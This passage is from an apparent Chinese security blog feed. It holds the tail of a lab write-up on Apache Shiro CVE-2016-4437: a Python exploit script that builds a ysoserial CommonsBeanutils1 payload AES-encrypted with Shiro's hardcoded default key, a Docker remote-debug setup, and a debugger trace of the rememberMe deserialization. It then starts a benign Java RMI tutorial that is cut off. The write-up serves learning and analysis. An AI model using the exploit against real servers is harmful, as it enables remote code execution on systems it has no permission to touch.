class="line">            <span class="keyword">raise</span> Exception(<span class="string">'jar file not found'</span>)</span><br><span class="line">        popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsBeanutils1'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># popen = subprocess.Popen(['java', '-jar', fp, 'URLDNS', command], stdout=subprocess.PIPE)</span></span><br><span class="line">        BS = AES.block_size</span><br><span class="line">        pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">        key = KEY[<span class="number">0</span>] + <span class="string">"',"</span></span><br><span class="line"></span><br><span class="line">        mode = AES.MODE_CBC</span><br><span class="line">        iv = uuid.uuid4().bytes</span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">        file_body = pad(popen.stdout.read())</span><br><span class="line">        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">        <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    vul = CVE_2016_4437(<span class="string">'http://192.168.116.132:8080'</span>)</span><br><span class="line">    print(vul.exp(<span class="string">'touch /tmp/test2'</span>))</span><br><span class="line">    <span class="comment"># print(vul.exp('http://shirodebug.*******.ceye.io'))</span></span><br><span class="line">    print(vul.poc())</span><br></pre></td></tr></table></figure><p>执行结果：</p><p>vul.exp(‘touch /tmp/test2’)：生成了文件</p><p><img src="/imgs/image-20200623142438431.png" alt="image-20200623142438431"></p><p>vul.poc()：DNSLog记录如下</p><p><img src="/imgs/image-20200623142900112.png" alt="image-20200623142900112"></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>如果不想像我这么麻烦，可以直接阅读下大佬的博客，我觉得讲得很好<a href="http://saucer-man.com/information_security/396.html#comment-175" target="_blank" rel="noopener">http://saucer-man.com/information_security/396.html#comment-175</a></p><p>基于：</p><ul><li>Windows  + IDEA + python3.7 + git</li><li>Centos7.8 + docker</li></ul><p>首先准备调试环境。</p><p>调试环境搭建遇到了无数的坑，因为之前没接触过远程调试，过程如此艰难，前前后后花了2周/(ㄒoㄒ)/~~，现在记录下，也是总结。本来考虑的是直接用vulhub的docker环境进行远程调试，但是发现用的jar包，没有源代码，这一方法不考虑了；接着找了vulfocus的镜像，可能本人技术不行，命令一直运行失败（后来发现可能跟选择的ysoserial的Gadget有关）；最后找到一篇saucerman写的博客，给了我启发，打算自己生成war包结合docker进行远程调试（当然也可以在本地分析，但我当练手了。。）。</p><h4 id="1、本地生成war包"><a href="#1、本地生成war包" class="headerlink" title="1、本地生成war包"></a>1、本地生成war包</h4><ul><li>拉取git分支：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout 1.2.4</span><br></pre></td></tr></table></figure><ul><li><p>修改samples\web\pom.xml，pom.xml提供了项目依赖信息，方便下载进行包管理【Maven项目使用<a href="https://zh.wikipedia.org/wiki/项目对象模型" target="_blank" rel="noopener">项目对象模型</a>（Project Object Model，POM）来配置，项目对象模型存储在名为 pom.xml 的文件中。我觉得跟python的pip稍微有点像，都是包管理工具】。这里修改jstl【jsp标准标签库，jsp需要引用】版本为1.2，说明下为什么加版本为1.2，查了下是因为1.0与1.1没有在Maven仓库中存在，而且其使用方式都是将jstl.jar与standard.jar添加到编译路径下，并将tld文件夹中的文件(或者包含文件夹)复制到/WEB-INF，然后配置web.xml文件。</p><figure class="highlight xml"><figcaption><span>samples\web\pom.xml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">&lt;!--修改jstl[jsp标准标签库]版本为1.2--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>接下来点击“File”的open，直接打开samples\web目录，导入文件，IDEA的maven会自动通过pom.xml下载依赖包。</p><img src="/imgs/image-20200628155251946.png" alt="image-20200628155251946" style="zoom:50%;" /><p>等待下载构建完成，会自动生成war包，war包在如图target下</p><p><img src="/imgs/image-20200629110708280.png" alt="image-20200629110708280"></p></li><li><p>如果要本地直接进行debug分析，可以往下看，忽略【2、远程调试环境】；如果想远程调试，忽略下面直接跳到【2、远程调试环境】</p></li><li><p>右上角设置Run/Debug Configurations，添加tomcat server-&gt;local</p><p><img src="/imgs/image-20200628155618771.png" alt="image-20200628155618771"></p><img src="/imgs/image-20200628155740557.png" alt="image-20200628155740557" style="zoom: 50%;" /><p>添加tomcat，选择本地tomcat目录</p><p><img src="/imgs/image-20200628155929898.png" alt="image-20200628155929898"></p><p>设置Deployment部署包，点击右侧+，添加图片war包，点击apply，然后点击OK确定。</p><img src="/imgs/image-20200628160155471.png" alt="image-20200628160155471" style="zoom:150%;" /></li></ul><h4 id="2、远程调试"><a href="#2、远程调试" class="headerlink" title="2、远程调试"></a>2、远程调试</h4><p>如果本地分析的话，就直接忽略这里就好。</p><p>centos上写好Dockerfile，自己制作镜像然后远程调试。</p><p>步骤如下：</p><p>创建目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir shiro_test</span><br><span class="line"><span class="built_in">cd</span> shiro_test</span><br><span class="line"><span class="comment"># 手动复制之前生成的war包到shiro_test下</span></span><br><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile编辑内容如下，其中ENV JPDA_ADDRESS=”12345”和CMD [“catalina.sh”, “jpda”, “run”]可以设置远程调试：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomcat:<span class="number">8.5</span>.<span class="number">46</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> <span class="string">"R17a"</span></span><br><span class="line"><span class="keyword">ENV</span> ROOT_PATH /usr/local/tomcat/webapps/</span><br><span class="line"><span class="keyword">ENV</span> JPDA_ADDRESS=<span class="string">"12345"</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$ROOT_PATH</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> rm -rf ./*</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> samples-web-1.2.4.war ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mv samples-web-1.2.4.war ROOT.war</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span> <span class="number">12345</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"catalina.sh"</span>, <span class="string">"jpda"</span>, <span class="string">"run"</span>] <span class="comment">#启动tomcat shell执行程序</span></span></span><br></pre></td></tr></table></figure><p>用Dockerfile制作镜像，并创建容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t shiro:1.4 .</span><br><span class="line"><span class="comment"># 第一次用的这个命令，容器内不能上网，无法ping DNS：docker run -e JPDA_ADDRESS=12345 -p 8080:8080 -p 12345:12345 shiro:1.4</span></span><br><span class="line"><span class="comment"># 推荐用这个，容器可以访问外网，这样方便执行ping命令</span></span><br><span class="line">docker run --name shiro_vul -e JPDA_ADDRESS=12345 --net=host shiro:1.4</span><br></pre></td></tr></table></figure><p>进入容器拷贝ROOT出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it b2e:/usr/<span class="built_in">local</span>/tomcat/webapps/ROOT .</span><br></pre></td></tr></table></figure><p>把拷贝出来的ROOT导入IDEA，然后根据下图设置远程调试</p><p><img src="/imgs/image-20200629125135394.png" alt="image-20200629125135394"></p><p>调试环境搭建完成，接下来debug调试分析。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>看了几篇博文都是在org.apache.shiro.mgt.DefaultSecurityManager#resolvePrincipals开始断点，后来发现这里已经开始处理cookie中rememberMe值进行解密过程了。</p><h4 id="用户名-gt-Cookie："><a href="#用户名-gt-Cookie：" class="headerlink" title="用户名-&gt;Cookie："></a>用户名-&gt;Cookie：</h4><p>首先在lib的shiro-core-1.2.4.jar找到AbstractRememberMeManager#onSuccessfulLogin 83、84、85行打上断点。AbstractRememberMeManager是rememberMe的处理类，onSuccessfulLogin登录成功后的处理。</p><p><img src="/imgs/image-20200629152739189.png" alt="image-20200629152739189"></p><p>访问web页面<a href="http://192.168.116.142:8080/，点击进入log" target="_blank" rel="noopener">http://192.168.116.142:8080/，点击进入log</a> in：</p><p><img src="/imgs/image-20200629153056491.png" alt="image-20200629153056491"></p><p>可以看到这里提供了几组用户名密码可以登录：</p><p><img src="/imgs/image-20200629153203280.png" alt="image-20200629153203280"></p><p>点击debug开始进行调试：</p><p><img src="/imgs/image-20200629153308922.png" alt="image-20200629153308922"></p><p>选择一组进行登录，这里我选了lonestarr，因为是RememberMe导致的漏洞，这里要勾选上，点击login：</p><p><img src="/imgs/image-20200629153351576.png" alt="image-20200629153351576"></p><p>成功弹出debug界面</p><p><img src="/imgs/image-20200629153759978.png" alt="image-20200629153759978"></p><p>onSuccessLogin方法获取到三个参数：subject、token和info。forgetIdentity处理HTTP请求和响应，接着判断rememberMe是否为真，之前勾选了所以这里是true，接着rememberIdentity处理</p><p><img src="/imgs/image-20200629155321263.png" alt="image-20200629155321263"></p><p>F7进入rememberIdentity方法，首先getIdentityToRemember返回了authcInfo.principals的值为lonestarr，赋值给principals，紧接着调用this.rememberIdentity方法</p><p><img src="/imgs/image-20200629161120911.png" alt="image-20200629161120911"></p><p>F7进入this.rememberIdentity后，首先调用this.convertPrincipalsToBytes(accountPrincipals)，CTRL+左击方法名，这个方法就在下面，convertPrincipalsToBytes首先对accountPrincipals进行序列化，如果加密cipherService not null就进行加密，根据下面变量值transformationString可以知道似乎是AES/CBC/PKCS5Padding加密</p><p><img src="/imgs/image-20200629162855809.png" alt="image-20200629162855809"></p><p>F7进入convertPrincipalsToBytes，跟进encrypt方法，encrypt对序列化后的数据加密</p><p><img src="/imgs/image-20200629165007265.png" alt="image-20200629165007265"></p><p>跟进cipherService.encrypt，encrypt的两个参数，数据和key，进行加密，之前就得知AES用了硬编码，所以我们找下key</p><p><img src="/imgs/image-20200629165247674.png" alt="image-20200629165247674"></p><p>回退到上一断点</p><p><img src="/imgs/image-20200629165432354.png" alt="image-20200629165432354"></p><p>再F7进入到encrypt，到cipherService.encrypt按向下箭头，有两个方法可以进入，点击 getEncryptionCipherKey，</p><p><img src="/imgs/image-20200629165554940.png" alt="image-20200629165554940"></p><p>跟进后，CTRL+左击encryptionCipherKey</p><p><img src="/imgs/image-20200629165957200.png" alt="image-20200629165957200"></p><p>发现使用的默认key：kPH+bIxk5D2deZiIxcaaaA==</p><p><img src="/imgs/image-20200629170153323.png" alt="image-20200629170153323"></p><p>回到rememberIdentity方法，经过上面的分析我们知道到这里已经获取了remeberMe的序列化后的并且经过AES硬编码加密的字节数据bytes</p><p><img src="/imgs/image-20200629170625534.png" alt="image-20200629170625534"></p><p>接着F8调用this.rememberSerializedIdentity(subject, bytes)，F7跟进。rememberSerializedIdentity主要对数据进行了base64编码，并且设置cookie值为base64编码后的数据</p><p><img src="/imgs/image-20200629171852085.png" alt="image-20200629171852085"></p><p>至此，rememberIdentity通过convertPrincipalsToBytes和rememberSerializedIdentity完成了用户名的<strong>序列化-&gt;AES硬编码加密-&gt;base64编码</strong> 数据设置给cookie。</p><h4 id="Cookie-gt-用户名："><a href="#Cookie-gt-用户名：" class="headerlink" title="Cookie-&gt;用户名："></a>Cookie-&gt;用户名：</h4><p>在DefaultSecurityManager#resolvePrincipals 245行打上断点，然后开始debug</p><p><img src="/imgs/image-20200629185022699.png" alt="image-20200629185022699"></p><p>用burp发送请求（之前登录的lonestarr生成的cookie保存了），debug窗口弹开</p><p><img src="/imgs/image-20200629195658863.png" alt="image-20200629195658863"></p><p><img src="/imgs/image-20200629185545132.png" alt="image-20200629185545132"></p><p>跟进getRememberedIdentity，首先获取cookieRememberMeManager</p><p><img src="/imgs/image-20200629200557127.png" alt="image-20200629200557127"></p><p>rmm not null，调用getRememberedPrincipals，跟进getRememberedPrincipals</p><p><img src="/imgs/image-20200629200810304.png" alt="image-20200629200810304"></p><p>接着跟进getRememberedSerializedIdentity，对RememberMe进行base64解码并返回</p><p><img src="/imgs/image-20200629201210423.png" alt="image-20200629201210423"></p><p>F8继续往下</p><p><img src="/imgs/image-20200629201411867.png" alt="image-20200629201411867"></p><p>F7跟进convertBytesToPrincipals</p><p><img src="/imgs/image-20200629201506202.png" alt="image-20200629201506202"></p><p>调用this.decrypt，跟进decrypt方法</p><p><img src="/imgs/image-20200629201832857.png" alt="image-20200629201832857"></p><p>decrypt将加密数据使用默认key进行AES解密，是之前加密的逆过程</p><p><img src="/imgs/image-20200629201915372.png" alt="image-20200629201915372"></p><p>回到 convertBytesToPrincipals，接着进行反序列化并返回数据，此时数据已经经过了base64解码-&gt;AES解密-&gt;反序列化</p><p><img src="/imgs/image-20200629202258690.png" alt="image-20200629202258690"></p><p>接着F8，获取了最终身份：lonestarr</p><p><img src="/imgs/image-20200629202508449.png" alt="image-20200629202508449"></p><p>至此，用户名保存成cookie和cookie反解析成用户身份完成分析，反解析过程中反序列化没有验证对象，直接信任并进行反序列化从而导致可以执行命令。</p><h2 id="0x03-问题记录"><a href="#0x03-问题记录" class="headerlink" title="0x03 问题记录"></a>0x03 问题记录</h2><p>学习过程中遇到了几个问题，记录下，方便思考</p><ol><li>为什么要从AbstractRememberMeManager#onSuccessfulLogin和在DefaultSecurityManager#resolvePrincipals开始打断点，我是看了大佬们的博客才知道，但是如果我自己独立分析的话肯定是要找很久或者找很久都不清楚，怎么能够在新爆出漏洞时，自己独立分析时准确找到比较好的断点？</li><li>利用了ysoserial的CommonsBeanutils1的Gadgets，在分析调试时没有成功，但是却在vulhub复现时成功了，为什么？两者环境有什么区别？看到有遇到可能是版本问题引起的，我没有认真分析，留下这个疑惑，有空再更新。</li><li>经过本次深入分析学习的过程，Dockerfile构建镜像和远程调试也有了进一步的提升，虽然过程时艰难的，但是还是收获很多</li></ol><p>参考链接：</p><p><a href="https://www.freebuf.com/vuls/178014.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/178014.html</a></p><p><a href="https://www.freebuf.com/column/220958.html" target="_blank" rel="noopener">https://www.freebuf.com/column/220958.html</a></p><p><a href="https://www.freebuf.com/articles/system/125187.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/125187.html</a></p><p><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">https://www.cnblogs.com/loong-hon/p/10619616.html</a></p><p><a href="https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/s/shiro/1/poc.py</a></p><p><a href="https://www.jianshu.com/p/d168ecdce022" target="_blank" rel="noopener">https://www.jianshu.com/p/d168ecdce022</a></p><p><a href="https://www.cnblogs.com/yangxiaodi/p/10077054.html" target="_blank" rel="noopener">https://www.cnblogs.com/yangxiaodi/p/10077054.html</a></p><p><a href="http://saucer-man.com/information_security/396.html" target="_blank" rel="noopener">http://saucer-man.com/information_security/396.html</a></p><p><a href="https://blog.xinpapa.com/2019/03/19/docker-tomcat-debug/" target="_blank" rel="noopener">https://blog.xinpapa.com/2019/03/19/docker-tomcat-debug/</a></p><p><a href="https://stackoverflow.com/questions/35584063/debugging-tomcat-in-docker-container" target="_blank" rel="noopener">https://stackoverflow.com/questions/35584063/debugging-tomcat-in-docker-container</a></p><p><a href="https://www.cnblogs.com/zsty/p/9950722.html" target="_blank" rel="noopener">https://www.cnblogs.com/zsty/p/9950722.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> Apache Shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache Shiro </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> cookie Rememberme </tag>
            
            <tag> Shiro-550 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java RMI（Java Remote Method Invocation)、JRMP、RMI-IIOP</title>
      <link href="2020/06/14/Java%20RMI/"/>
      <url>2020/06/14/Java%20RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是Java-RMI？"><a href="#0x01-什么是Java-RMI？" class="headerlink" title="0x01 什么是Java RMI？"></a>0x01 什么是Java RMI？</h2><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。能直接传输序列化后的Java对象和<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDistributed_Garbage_Collection" target="_blank" rel="noopener">分布式垃圾收集</a>。它的实现依赖于<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FJava_Virtual_Machine" target="_blank" rel="noopener">Java虚拟机</a>(JVM)，因此它仅支持从一个JVM到另一个JVM的调用</p><p>看到这里你知道什么是Java RMI了吗？我比较笨，没看懂。</p><p>没关系，我又找了一篇博文，来看下它给出的解释：RMI，是Remote Method  Invocation（远程方法调用）的缩写，即在一个JVM中java程序调用在另一个远程JVM中运行的java程序，这个远程JVM既可以在同一台实体机上，也可以在不同的实体机上，两者之间通过网络进行通信。</p><p>到这里，好像能看懂点了，RMI顾名思义-远程调用，远程指什么？调用什么？远程指的是同一台主机上不同JVM之间的远程或者两台主机上的JVM的远程，调用的是JVM上运行的程序。</p><h2 id="0x02-通过一个例子来理解下"><a href="#0x02-通过一个例子来理解下" class="headerlink" title="0x02 通过一个例子来理解下"></a>0x02 通过一个例子来理解下</h2><p>RMI包括以下三个部分：</p><ul><li>Registry: 提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li><li>Server: 远程方法的提供者，并向Registry注册自身提供的服务</li><li>Client: 远程方法的消费者，从Registry获取远程方法的相关信息并且调用</li></ul><p>以下例子根据参考链接改编，一个远程接口IGoods，一个实现接口的类Goods，一个注册远程对象的类PutOnSaleServer，一个客户端调用的类ShoppingClient：</p><p>IGoods：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 必须继承Remote接口。</span></span><br><span class="line"><span class="comment"> * 所有参数和返回类型必须序列化(因为要网络传输)。</span></span><br><span class="line"><span class="comment"> * 任意远程对象都必须实现此接口。</span></span><br><span class="line"><span class="comment"> * 只有远程接口中指定的方法可以被调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IGoods</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="comment">// 所有方法必须抛出RemoteException</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">shopping</span><span class="params">(String person)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Goods:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端实现远程接口。</span></span><br><span class="line"><span class="comment"> * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Goods</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IGoods</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> numberOfComputations;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Goods</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">            + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a+b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">            + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a-b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">shopping</span><span class="params">(String person)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">            + numberOfComputations);</span><br><span class="line">        System.out.println(person + <span class="string">"is Shopping"</span>);</span><br><span class="line">        String a = person + <span class="string">" is shopping!"</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PutOnSaleServer.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建IGoods类的实例并在rmiregistry中注册。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PutOnSaleServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注册远程对象,向客户端提供远程对象服务。</span></span><br><span class="line">            <span class="comment">// 远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称，</span></span><br><span class="line">            <span class="comment">// 但是,将远程对象注册到RMI Registry之后,</span></span><br><span class="line">            <span class="comment">// 客户端就可以通过RMI Registry请求到该远程服务对象的stub，</span></span><br><span class="line">            <span class="comment">// 利用stub代理就可以访问远程服务对象了。</span></span><br><span class="line">            IGoods goods = <span class="keyword">new</span> Goods();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">            registry.bind(<span class="string">"Compute"</span>, goods);</span><br><span class="line">            System.out.println(<span class="string">"货物上架完成"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ShoppingClient.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShoppingClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 如果RMI Registry就在本地机器上，URL就是:rmi://localhost:1099/hello</span></span><br><span class="line">            <span class="comment">// 否则，URL就是：rmi://RMIService_IP:1099/hello</span></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"localhost"</span>);</span><br><span class="line">            <span class="comment">// 从Registry中检索远程对象的存根/代理</span></span><br><span class="line">            IGoods goods = (IGoods) registry.lookup(<span class="string">"Compute"</span>);</span><br><span class="line">            <span class="comment">// 调用远程对象的方法</span></span><br><span class="line">            System.out.println(goods.shopping(<span class="string">"小陈"</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span 